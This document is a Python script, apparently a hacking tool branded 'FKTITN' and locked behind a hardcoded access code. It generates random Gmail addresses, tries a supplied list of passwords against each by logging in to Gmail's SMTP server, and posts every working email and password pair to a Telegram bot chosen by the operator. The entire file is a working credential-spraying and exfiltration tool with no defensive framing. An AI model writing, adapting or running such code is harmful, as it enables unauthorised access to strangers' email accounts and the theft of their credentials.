import os
import random
import string
import smtplib
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, init, Style

# Initialize the library for color support
init()

# Secret code
h = 'FKTITIN12'
r = input('Enter the secret code: ')
if r == h:
    print('Correct password')
else:
    print("Incorrect password")
    exit()
os.system('clear')
from rich.console import Console
from rich.text import Text
import pyfiglet

console = Console()

# إنشاء النص بأسلوب ASCII Art
ascii_text = pyfiglet.figlet_format("FKTITN")

# إضافة اللون الأحمر للنص
console.print(f"[bold red]{ascii_text}[/]")
# Print "Lada is running" in light blue
print(Fore.CYAN + 'Lada is running' + Style.RESET_ALL)

# Request bot token and Chat ID from the user with orange-colored text
print(Fore.YELLOW + "🔹 Enter the bot token: ", end="")
BOT_TOKEN = input().strip()

print(Fore.YELLOW + "🔹 Enter the Chat ID: ", end="")
CHAT_ID = input().strip()

# Reset the colors after inputs
print(Style.RESET_ALL)

# Confirm the input
os.system('clear')
from rich.console import Console
from rich.text import Text
import pyfiglet

console = Console()

# إنشاء النص بأسلوب ASCII Art
ascii_text = pyfiglet.figlet_format("FKTITN")

# إضافة اللون الأحمر للنص
console.print(f"[bold red]{ascii_text}[/]")
# Ask for the passwords from the user
print(Fore.GREEN + "🔹 Enter the passwords: " + Style.RESET_ALL, end="")
passwords_to_try = input().split()

def generate_random_emails(count, domain="gmail.com"):
    """Generate random emails containing only English names with numbers"""
    names = [
        "Ahmed", "Sara", "Mohamed", "Layla", "Youssef", "Fatima", "Hassan", "Mariam", 
        "Karim", "Nada", "Ali", "Salma", "Abdullah", "Seif", "Jamal", "Nadia", 
        "Khadija", "Mahmoud", "Zahra", "Mousa", "Imane"
    ]
    emails = set()
    
    while len(emails) < count:
        name = random.choice(names)  # Choose a random name from the list
        random_digits = ''.join(random.choices(string.digits, k=5))  # Add random digits only
        email = f"{name}{random_digits}@{domain}"
        emails.add(email)
    
    return list(emails)

def check_email_validity(email, passwords):
    """Check the validity of the email and password using SMTP"""
    for password in passwords:
        try:
            # Set up the connection with the SMTP server
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.quit()
            return password  # If successful, return the password
        except smtplib.SMTPAuthenticationError:
            continue  # Try another password in the list
    return None  # If no password works

def send_to_telegram(message):
    """Send the data to the Telegram bot"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        print("✅ Successfully sent to Telegram!")
    else:
        print(f"❌ Sending failed! Check your token and Chat ID. (Error code: {response.status_code})")

# Ask the user to specify the number of emails
num_emails = int(input("🔹 How many emails do you want to generate? "))

# Generate the emails
random_emails = generate_random_emails(num_emails)

# Try to verify the email and password
for email in random_emails:
    password = check_email_validity(email, passwords_to_try)
    if password:
        message = f"📧 {email} - 🔑 {password} (Valid data)"
        print(message)  # Print the data locally
        send_to_telegram(message)  # Send it to Telegram
    else:
        print(f"❌ {email} - No password worked")
